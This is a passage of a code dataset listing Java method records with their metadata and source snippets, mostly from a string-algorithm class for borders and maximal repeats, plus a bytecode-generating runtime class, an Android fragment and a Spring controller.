"https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31948, "method_name": "deallocate", "class_name": "BorderSubstring", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void deallocate() {\n\t\tsuper.deallocate();\n\t\trightCharacters=null;\n\t\trightLengths=null;\n\t\tleftCharacters=null;\n\t\tleftLengths=null;\n\t\tif (tmpString!=null) {\n\t\t\ttmpString.deallocate();\n\t\t\ttmpString=null;\n\t\t}\n\t\tlongestBorder=null;  // This is just a pointer: it doesn't need to be deallocated.\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31949, "method_name": "getInstance", "class_name": "BorderSubstring", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getInstance() {\n\t\treturn new BorderSubstring(alphabetLength,log2alphabetLength,bitsToEncodeAlphabetLength,bwtLength,log2BWTLength,bitsToEncodeBWTLength);\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31950, "method_name": "getEpsilon", "class_name": "BorderSubstring", "params": ["long"], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getEpsilon(long[] C) {\n\t\tBorderSubstring out = (BorderSubstring)getInstance();\n\n\t\t// $bwtIntervals$\n\t\tout.nIntervals=alphabetLength+1;\n\t\tout.bwtIntervals[0][0]=0;  // $#$\n\t\tout.bwtIntervals[0][1]=0;\n\t\tfor (int i=0; i<alphabetLength-1; i++) {  // Other characters\n\t\t\tout.bwtIntervals[i+1][0]=C[i];\n\t\t\tout.bwtIntervals[i+1][1]=C[i+1]-1;\n\t\t}\n\t\tout.bwtIntervals[alphabetLength][0]=C[alphabetLength-1];\n\t\tout.bwtIntervals[alphabetLength][1]=bwtLength-1;\n\n\t\t// Other variables\n\t\tout.address=-1;\n\t\tout.log2address=-1;\n\t\tout.previousAddress=-1;\n\t\tout.length=0;\n\t\tout.log2length=-1;\n\t\tout.bitsToEncodeLength=1;\n\t\tout.firstCharacter=-1;\n\t\tout.hasBeenExtended=false;\n\t\tout.hasBeenStolen=false;\n\t\tout.computeRightContext();\n\t\tout.leftContext=-1;\n\t\tout.isLeftExtensionOfMaximalRepeat=false;\n\t\tout.nRight=0;\n\t\tout.nLeft=0;\n\t\tout.longestBorderLength=0;\n\t\tout.shortestPeriodLength=0;\n\t\tout.maxPossibleOccurrences=textLength+1;\n\t\tout.longestBorderRightCharacter=-1;\n\t\tout.longestBorderLeftCharacter=-1;\n\n\t\treturn out;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31951, "method_name": "toString", "class_name": "BorderSubstring", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\tString out = super.toString()+\" | \";\n\t\tout+=\"longestBorderLength=\"+longestBorderLength+\" shortestPeriodLength=\"+shortestPeriodLength+\" maxPossibleOccurrences=\"+maxPossibleOccurrences+\" \";\n\t\tout+=\"longestBorderRightCharacter=\"+longestBorderRightCharacter+\" longestBorderLeftCharacter=\"+longestBorderLeftCharacter+\" \";\n\t\tout+=\"nRight=\"+nRight+\" \";\n\t\tout+=\"nLeft=\"+nLeft+\" \";\n\t\tout+=\"rightArray: \";\n\t\tfor (int i=0; i<nRight; i++) out+=\"(\"+rightCharacters[i]+\",\"+rightLengths[i]+\") \";\n\t\tout+=\"leftArray: \";\n\t\tfor (int i=0; i<nLeft; i++) out+=\"(\"+leftCharacters[i]+\",\"+leftLengths[i]+\") \";\n\t\treturn out;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31952, "method_name": "pushHeadPrime", "class_name": "BorderSubstring", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void pushHeadPrime(Stream stack, Substring[] cache) {\n\t\tsuper.pushHeadPrime(stack,cache);\n\t\tstack.push(isLeftExtensionOfMaximalRepeat?1:0,1);\n\t\tif (length>1) stack.push(longestBorderLength,log2length);\nif (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|b|\"+( 1+(length>1?log2length:0) ));\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31953, "method_name": "readHeadPrime", "class_name": "BorderSubstring", "params": ["Stream", "Substring", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void readHeadPrime(Stream stack, Substring[] cache, boolean fast) {\n\t\tsuper.readHeadPrime(stack,cache,fast);\n\t\tisLeftExtensionOfMaximalRepeat=stack.read(1)==1?true:false;\n\t\tlongestBorderLength=length>1?stack.read(log2length):0;\n\n\t\tshortestPeriodLength=length-longestBorderLength;\n\t\tmaxPossibleOccurrences=length==0?textLength+1:(long)Math.ceil((textLength-length+1D)/shortestPeriodLength);\n \t\tif (longestBorderLength==0) {\n \t\t\tnRight=0;\n \t\t\tnLeft=0;\n \t\t\tlongestBorderRightCharacter=-1;\n \t\t\tlongestBorderLeftCharacter=-1;\n \t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31954, "method_name": "popHeadPrime", "class_name": "BorderSubstring", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void popHeadPrime(Stream stack, Substring[] cache) {\n\t\tstack.pop( (length>1?log2length:0) +\n\t\t\t\t   1 );\n\t\tsuper.popHeadPrime(stack,cache);\nif (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|-|b|\"+( (length>1?log2length:0) +\n\t\t\t\t   \t\t\t\t\t\t\t\t\t\t1 ));\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31955, "method_name": "pushAppendix", "class_name": "BorderSubstring", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void pushAppendix(Stream stack, Substring[] cache) {\n\t\tsuper.pushAppendix(stack,cache);\n\t\tif (longestBorderLength==0) return;\n\n\t\tif (length>Constants.BORDER_THRESHOLD_2) {\n\t\t\t// Large regime\n\t\t\treturn;\n\t\t}\n\t\tboolean pushInStack = false;\n\t\tif (length>0 && length<=Constants.BORDER_THRESHOLD_1) {\n\t\t\t// Small regime\n\t\t\tif (cache.length>0) clone(cache[(int)length-1]);\n\t\t\telse pushInStack=true;\n\t\t}\n\t\telse {\n\t\t\t// Medium regime\n\t\t\tpushInStack=true;\n\t\t}\n\t\tif (pushInStack) {\n\t\t\tstack.push(nRight,bitsToEncodeAlphabetLength);\n\t\t\tstack.push(nLeft,bitsToEncodeAlphabetLength);\n\t\t\tint i;\n\t\t\tfor (i=0; i<nRight; i++) stack.push(rightCharacters[i],log2alphabetLength);\n\t\t\tfor (i=0; i<nRight; i++) stack.push(rightLengths[i],log2length);\n\t\t\tfor (i=0; i<nLeft; i++) stack.push(leftCharacters[i],log2alphabetLength);\n\t\t\tfor (i=0; i<nLeft; i++) stack.push(leftLengths[i],log2length);\nif (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|b|\"+( bitsToEncodeAlphabetLength*2+(nRight+nLeft)*(log2alphabetLength+log2length) ));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31956, "method_name": "readAppendix", "class_name": "BorderSubstring", "params": ["Stream", "Substring", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void readAppendix(Stream stack, Substring[] cache, boolean fast) {\n\t\tsuper.readAppendix(stack,cache,fast);\n\t\tif (longestBorderLength==0) return;\n\n\t\tif (length>Constants.BORDER_THRESHOLD_2) {\n\t\t\t// Large regime\n\t\t\treturn;\n\t\t}\n\t\tboolean readFromStack = false;\n\t\tif (length>0 && length<=Constants.BORDER_THRESHOLD_1) {\n\t\t\t// Small regime\n\t\t\tif (cache!=null && cache.length>0) {\n\t\t\t\tBorderSubstring bs = (BorderSubstring)cache[(int)length-1];\n\t\t\t\tint i;\n\t\t\t\tnRight=bs.nRight;  // $nRight>0$ necessarily at this point\n\t\t\t\tSystem.arraycopy(bs.rightCharacters,0,rightCharacters,0,nRight);\n\t\t\t\tSystem.arraycopy(bs.rightLengths,0,rightLengths,0,nRight);\n\t\t\t\tnLeft=bs.nLeft;  // $nLeft>0$ necessarily at this point\n\t\t\t\tSystem.arraycopy(bs.leftCharacters,0,leftCharacters,0,nLeft);\n\t\t\t\tSystem.arraycopy(bs.leftLengths,0,leftLengths,0,nLeft);\n\t\t\t}\n\t\t\telse readFromStack=true;\n\t\t}\n\t\telse {\n\t\t\t// Medium regime\n\t\t\treadFromStack=true;\n\t\t}\n\t\tif (readFromStack) {\n\t\t\tnRight=(int)stack.read(bitsToEncodeAlphabetLength);\n\t\t\tnLeft=(int)stack.read(bitsToEncodeAlphabetLength);\n\t\t\tif (fast) stack.setPosition( stack.getPosition()+\n\t\t\t\t\t\t\t\t\t\t nRight*log2alphabetLength+\n\t\t\t\t\t\t\t\t\t\t nRight*log2length+\n\t\t\t\t\t\t\t\t\t\t nLeft*log2alphabetLength+\n\t\t\t\t\t\t\t\t\t\t nLeft*log2length);\n\t\t\telse {\n\t\t\t\tint i;\n\t\t\t\tfor (i=0; i<nRight; i++) rightCharacters[i]=(int)stack.read(log2alphabetLength);\n\t\t\t\tfor (i=0; i<nRight; i++) rightLengths[i]=(int)stack.read(log2length);\n\t\t\t\tfor (i=0; i<nLeft; i++) leftCharacters[i]=(int)stack.read(log2alphabetLength);\n\t\t\t\tfor (i=0; i<nLeft; i++) leftLengths[i]=(int)stack.read(log2length);\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31957, "method_name": "popAppendix", "class_name": "BorderSubstring", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void popAppendix(Stream stack, Substring[] cache) {\n\t\tif (longestBorderLength>0) {\n\t\t\tif (length>Constants.BORDER_THRESHOLD_2) {\n\t\t\t\t// Large regime\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tboolean popFromStack = false;\n\t\t\tif (length>0 && length<=Constants.BORDER_THRESHOLD_1) {\n\t\t\t\t// Small regime\n\t\t\t\tif (cache.length==0) popFromStack=true;\n\t\t\t}\n\t\t\telse {\n\t\t\t\t// Medium regime\n\t\t\t\tpopFromStack=true;\n\t\t\t}\n\t\t\tif (popFromStack) {\n\t\t\t\tstack.pop( bitsToEncodeAlphabetLength+\n\t\t\t\t\t\t   bitsToEncodeAlphabetLength+\n\t\t\t\t\t\t   nRight*log2alphabetLength+\n\t\t\t\t\t\t   nRight*log2length+\n\t\t\t\t\t\t   nLeft*log2alphabetLength+\n\t\t\t\t\t\t   nLeft*log2length );\nif (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|-|b|\"+(bitsToEncodeAlphabetLength+\n\t\t\t\t\t\t\t\t\t\t\t\t\t   bitsToEncodeAlphabetLength+\n\t\t\t\t\t\t\t\t\t\t\t\t\t   nRight*log2alphabetLength+\n\t\t\t\t\t\t\t\t\t\t\t\t\t   nRight*log2length+\n\t\t\t\t\t\t\t\t\t\t\t\t\t   nLeft*log2alphabetLength+\n\t\t\t\t\t\t\t\t\t\t\t\t\t   nLeft*log2length));\n\t\t\t}\n\t\t}\n\t\tsuper.popAppendix(stack,cache);\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31958, "method_name": "initAfterExtending", "class_name": "BorderSubstring", "params": ["Substring", "int", "RigidStream", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void initAfterExtending(Substring suffix, int firstCharacter, RigidStream characterStack, int[] buffer) {\n\t\tsuper.initAfterExtending(suffix,firstCharacter,characterStack,buffer);\n\t\tleftContext=-1;\n\t\tisLeftExtensionOfMaximalRepeat=false;\n\t\tnRight=0;\n\t\tnLeft=0;\n\t\tlongestBorderLength=0;\n\t\tif (length>1 && firstCharacter!=-1 && rightContext>1) {  // We don't compute borders for left-extensions that are not right-maximal\n\t\t\tint pos = buffer[firstCharacter];\n\t\t\tif (pos>=0) longestBorderLength=((BorderSubstring)suffix).rightLengths[pos]+1;\n\t\t\telse {\n\t\t\t\tint lastCharacter;\n\t\t\t\tif (length==2) lastCharacter=suffix.firstCharacter;\n\t\t\t\telse lastCharacter = (int)(characterStack.getElementAt(0));\n\t\t\t\tif (lastCharacter==firstCharacter) longestBorderLength=1;\n\t\t\t}\n\t\t}\n\t\tshortestPeriodLength=length-longestBorderLength;\n\t\tmaxPossibleOccurrences=length==0?textLength+1:(long)Math.ceil((textLength-length+1D)/shortestPeriodLength);\n\t\tlongestBorderRightCharacter=-1;\n\t\tlongestBorderLeftCharacter=-1;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31959, "method_name": "initAfterReading", "class_name": "BorderSubstring", "params": ["Stream", "RigidStream", "SimpleStream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void initAfterReading(Stream stack, RigidStream characterStack, SimpleStream pointerStack, Substring[] cache) {\n\t\tsuper.initAfterReading(stack,characterStack,pointerStack,cache);\n\t\tnRight=0;\n\t\tnLeft=0;\n\t\tlongestBorderRightCharacter=-1;\n\t\tlongestBorderLeftCharacter=-1;\n\t\tif (longestBorderLength==0) return;\n\n\t\tloadLongestBorder(stack,pointerStack,cache);\n\t\tbuildRightArray(characterStack);\n\t\tif (isLeftExtensionOfMaximalRepeat) {\n\t\t\t// The longest border of $aw$, where $w$ is a maximal repeat, is itself a\n\t\t\t// string $az$ where $z$ is a maximal repeat. Thus, we only need to push on\n\t\t\t// the stack the left array of left-extensions of maximal repeats.\n\t\t\tbuildLeftArrayOfRightExtensions(characterStack);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31960, "method_name": "loadLongestBorder", "class_name": "BorderSubstring", "params": ["Stream", "SimpleStream", "Substring"], "throws": null, "modifiers": ["private", "final"], "return_type": "void", "snippet": "\tprivate final void loadLongestBorder(Stream stack, SimpleStream pointerStack, Substring[] cache) {\n\t\tif (longestBorderLength<=Constants.BORDER_THRESHOLD_1) longestBorder=(BorderSubstring)cache[(int)longestBorderLength-1];\n\t\telse {\n\t\t\tlong backupPointer = stack.getPosition();\n\t\t\tstack.setPosition(pointerStack.getElementAt(longestBorderLength-1));\n\t\t\tif (tmpString==null) tmpString=(BorderSubstring)getInstance();  // Executed at most once\n\t\t\ttmpString.read(stack,cache,false,false,false);\nif (Constants.TRACK_HITS) System.out.println(tmpString.length);\n\t\t\tlongestBorder=tmpString;\n\t\t\tstack.setPosition(backupPointer);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31961, "method_name": "buildRightArray", "class_name": "BorderSubstring", "params": ["RigidStream"], "throws": null, "modifiers": ["private", "final"], "return_type": "void", "snippet": "\tprivate final void buildRightArray(RigidStream characterStack) {\n\t\tlongestBorderRightCharacter=(int)characterStack.getElementAt(longestBorderLength);\n\t\tif (longestBorder.nRight==0) {\n\t\t\tnRight=1;\n\t\t\trightCharacters[0]=longestBorderRightCharacter;\n\t\t\trightLengths[0]=longestBorderLength;\n\t\t\treturn;\n\t\t}\n\t\tint k = Arrays.binarySearch(longestBorder.rightCharacters,0,longestBorder.nRight,longestBorderRightCharacter);\n\t\tif (k>=0) {\n\t\t\tnRight=longestBorder.nRight;\n\t\t\tSystem.arraycopy(longestBorder.rightCharacters,0,rightCharacters,0,nRight);\n\t\t\tSystem.arraycopy(longestBorder.rightLengths,0,rightLengths,0,nRight);\n\t\t\trightLengths[k]=longestBorderLength;\n\t\t}\n\t\telse {\n\t\t\tnRight=longestBorder.nRight+1;\n\t\t\tk=-k-1;\n\t\t\tSystem.arraycopy(longestBorder.rightCharacters,0,rightCharacters,0,k);\n\t\t\trightCharacters[k]=longestBorderRightCharacter;\n\t\t\tSystem.arraycopy(longestBorder.rightCharacters,k,rightCharacters,k+1,nRight-k-1);\n\t\t\tSystem.arraycopy(longestBorder.rightLengths,0,rightLengths,0,k);\n\t\t\trightLengths[k]=longestBorderLength;\n\t\t\tSystem.arraycopy(longestBorder.rightLengths,k,rightLengths,k+1,nRight-k-1);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31962, "method_name": "buildLeftArray", "class_name": "BorderSubstring", "params": ["RigidStream"], "throws": null, "modifiers": ["private", "final"], "return_type": "void", "snippet": "\tprivate final void buildLeftArray(RigidStream characterStack) {\n\t\tlongestBorderLeftCharacter=(int)(characterStack.getElementAt(length-longestBorderLength-1));\n\t\tif (longestBorder.nLeft==0) {\n\t\t\tnLeft=1;\n\t\t\tleftCharacters[0]=longestBorderLeftCharacter;\n\t\t\tleftLengths[0]=longestBorderLength;\n\t\t\treturn;\n\t\t}\n\t\tint k = Arrays.binarySearch(longestBorder.leftCharacters,0,longestBorder.nLeft,longestBorderLeftCharacter);\n\t\tif (k>=0) {\n\t\t\tnLeft=longestBorder.nLeft;\n\t\t\tSystem.arraycopy(longestBorder.leftCharacters,0,leftCharacters,0,nLeft);\n\t\t\tSystem.arraycopy(longestBorder.leftLengths,0,leftLengths,0,nLeft);\n\t\t\tleftLengths[k]=longestBorderLength;\n\t\t}\n\t\telse {\n\t\t\tnLeft=longestBorder.nLeft+1;\n\t\t\tk=-k-1;\n\t\t\tSystem.arraycopy(longestBorder.leftCharacters,0,leftCharacters,0,k);\n\t\t\tleftCharacters[k]=longestBorderLeftCharacter;\n\t\t\tSystem.arraycopy(longestBorder.leftCharacters,k,leftCharacters,k+1,nLeft-k-1);\n\t\t\tSystem.arraycopy(longestBorder.leftLengths,0,leftLengths,0,k);\n\t\t\tleftLengths[k]=longestBorderLength;\n\t\t\tSystem.arraycopy(longestBorder.leftLengths,k,leftLengths,k+1,nLeft-k-1);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31963, "method_name": "buildLeftArrayOfRightExtensions", "class_name": "BorderSubstring", "params": ["RigidStream"], "throws": null, "modifiers": ["private", "final"], "return_type": "void", "snippet": "\tprivate final void buildLeftArrayOfRightExtensions(RigidStream characterStack) {\n\t\tint c, k;\n\t\tlongestBorderLeftCharacter=(int)(characterStack.getElementAt(length-longestBorderLength-1));\n\t\tnLeft=0;\n\t\tfor (c=1; c<longestBorderLeftCharacter+1; c++) {\n\t\t\tif (bwtIntervals[c][1]-bwtIntervals[c][0]<0) continue;\n\t\t\tk=Arrays.binarySearch(longestBorder.leftCharacters,0,longestBorder.nLeft,c-1);\n\t\t\tif (k>=0) {\n\t\t\t\tleftCharacters[nLeft]=longestBorder.leftCharacters[k];\n\t\t\t\tleftLengths[nLeft]=longestBorder.leftLengths[k];\n\t\t\t\tnLeft++;\n\t\t\t}\n\t\t}\n\t\tif (bwtIntervals[longestBorderLeftCharacter+1][1]-bwtIntervals[longestBorderLeftCharacter+1][0]>=0) {\n\t\t\tleftCharacters[nLeft]=longestBorderLeftCharacter;\n\t\t\tleftLengths[nLeft]=longestBorderLength;\n\t\t\tnLeft++;\n\t\t}\n\t\tfor (c=longestBorderLeftCharacter+2; c<=alphabetLength; c++) {\n\t\t\tif (bwtIntervals[c][1]-bwtIntervals[c][0]<0) continue;\n\t\t\tk=Arrays.binarySearch(longestBorder.leftCharacters,0,longestBorder.nLeft,c-1);\n\t\t\tif (k>=0) {\n\t\t\t\tleftCharacters[nLeft]=longestBorder.leftCharacters[k];\n\t\t\t\tleftLengths[nLeft]=longestBorder.leftLengths[k];\n\t\t\t\tnLeft++;\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31964, "method_name": "fillBuffer", "class_name": "BorderSubstring", "params": ["int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void fillBuffer(int[] buffer, boolean right) {\n\t\tif (right) {\n\t\t\tfor (int i=0; i<nRight; i++) buffer[rightCharacters[i]]=i;\n\t\t}\n\t\telse {\n\t\t\tfor (int i=0; i<nLeft; i++) buffer[leftCharacters[i]]=i;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31965, "method_name": "emptyBuffer", "class_name": "BorderSubstring", "params": ["int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void emptyBuffer(int[] buffer, boolean right) {\n\t\tif (right) {\n\t\t\tfor (int i=0; i<nRight; i++) buffer[rightCharacters[i]]=-1;\n\t\t}\n\t\telse {\n\t\t\tfor (int i=0; i<nLeft; i++) buffer[leftCharacters[i]]=-1;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BorderSubstring.java", "stars": "2", "class_props": {"extends": "MaximalRepeat", "implements": null, "modifiers": ["public"]}}, {"id": 31966, "method_name": "register", "class_name": "Static", "params": ["MethodHandles", "String", "Class<?>"], "throws": null, "modifiers": ["static", "protected"], "return_type": "Object", "snippet": "    protected static Object register(MethodHandles.Lookup lookup, String name, Class<?> klass) {\n        LOOKUP_MAP.get(lookup.lookupClass()).lookup = lookup;\n        return null;\n    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/Static.java", "stars": "5", "class_props": {"extends": "FunValue", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31967, "method_name": "spin", "class_name": "Static", "params": ["List<Class>", "Class<?>", "MethodHandle"], "throws": null, "modifiers": ["public", "static"], "return_type": "Static<?>", "snippet": "    public static Static<?> spin(List<Class<?>> arguments, Class<?> result, MethodHandle entryPoint) {\n        var registerLookupHack = new ConstantDynamic(\"registerHack\", Object.class.descriptorString(), REGISTER_BOOTSTRAP);\n\n        var myname = Type.getInternalName(Static.class);\n        var newclassname = myname + \"Impl\";\n\n        // fixme.. not really a need for dynamically spinning this....\n        var cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);\n        cw.visit(V14, ACC_FINAL | ACC_PRIVATE, newclassname, null, myname, null);\n\n        {\n            var mw = cw.visitMethod(ACC_PRIVATE | ACC_STATIC, \"<clinit>\", methodType(void.class).descriptorString(), null, null);\n            mw.visitCode();\n            mw.visitLdcInsn(registerLookupHack);\n            mw.visitInsn(RETURN);\n            mw.visitMaxs(0, 0);\n            mw.visitEnd();\n        }\n\n        {\n            var mw = cw.visitMethod(ACC_PRIVATE, \"<init>\", methodType(void.class).descriptorString(), null, null);\n            mw.visitCode();\n            mw.visitVarInsn(ALOAD, 0);\n            mw.visitMethodInsn(INVOKESPECIAL, myname, \"<init>\", methodType(void.class).descriptorString(), false);\n            mw.visitVarInsn(ALOAD, 0);\n            mw.visitInsn(RETURN);\n            mw.visitMaxs(0, 0);\n            mw.visitEnd();\n        }\n\n        cw.visitEnd();\n\n        var bytes = cw.toByteArray();\n\n        var definedClass = AnonClassLoader.defineClass(Static.class.getClassLoader(), bytes);\n        var klass = definedClass.asSubclass(Static.class);\n\n        var privateLookup = LOOKUP_MAP.get(klass).lookup;\n        LOOKUP_MAP.get(klass).infotable = new Infotable(arguments, entryPoint);\n\n        MethodHandle con;\n        try {\n            con = privateLookup.findConstructor(klass, methodType(void.class));\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            throw new RuntimeException(e);\n        }\n\n        try {\n            return (Static) con.invoke();\n        } catch (Throwable throwable) {\n            throw new RuntimeException(throwable);\n        }\n    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/Static.java", "stars": "5", "class_props": {"extends": "FunValue", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31968, "method_name": "infoTable", "class_name": "Static", "params": [], "throws": null, "modifiers": [], "return_type": "Infotable", "snippet": "    Infotable infoTable() {\n        return LOOKUP_MAP.get(getClass()).infotable;\n    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/Static.java", "stars": "5", "class_props": {"extends": "FunValue", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31969, "method_name": "arity", "class_name": "Static", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int arity() {\n        return infoTable().arguments().size();\n    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/Static.java", "stars": "5", "class_props": {"extends": "FunValue", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31970, "method_name": "saturatedApplication", "class_name": "Static", "params": ["LinkRequest", "LinkerServices"], "throws": ["NoSuchFieldException", "IllegalAccessException"], "modifiers": ["protected"], "return_type": "GuardedInvocation", "snippet": "    protected GuardedInvocation saturatedApplication(LinkRequest linkRequest, LinkerServices linkerServices) throws NoSuchFieldException, IllegalAccessException {\n        var metadata = infoTable();\n\n        var argument = metadata.arguments();\n\n        var mh = metadata.entryPoint();\n        mh = dropArguments(mh, 0, Value.class, Void.class);\n\n        return new GuardedInvocation(mh, Guards.isOfClass(getClass(), mh.type().changeReturnType(boolean.class)));\n    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/Static.java", "stars": "5", "class_props": {"extends": "FunValue", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31971, "method_name": "toString", "class_name": "Static", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "String", "snippet": "    public final String toString() {\n        return Static.class.getSimpleName() + \":\" + infoTable();\n    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/Static.java", "stars": "5", "class_props": {"extends": "FunValue", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31972, "method_name": "onCreateView", "class_name": "DetailFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "\t  public View onCreateView(LayoutInflater inflater, ViewGroup container,\n\t      Bundle savedInstanceState) {\n\t    View view = inflater.inflate(R.layout.fragment_rssitem_detail,\n\t        container, false);\n\t    return view;\n\t  }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/HBfragment/src/com/example/hbfragment/DetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 31973, "method_name": "setText", "class_name": "DetailFragment", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t  public void setText(String item) {\n\t    TextView view = (TextView) getView().findViewById(R.id.detailsText);\n\t    view.setText(item);\n\t  }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/HBfragment/src/com/example/hbfragment/DetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 31974, "method_name": "home", "class_name": "TestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String home() {\n        return \"Spring boot is working!\";\n    }", "url": "https://raw.githubusercontent.com/WhiteFerrari666/Medication/develop/src/main/java/controller/TestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31975, "method_name": "getCount", "class_name": "DetailStatisticAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return 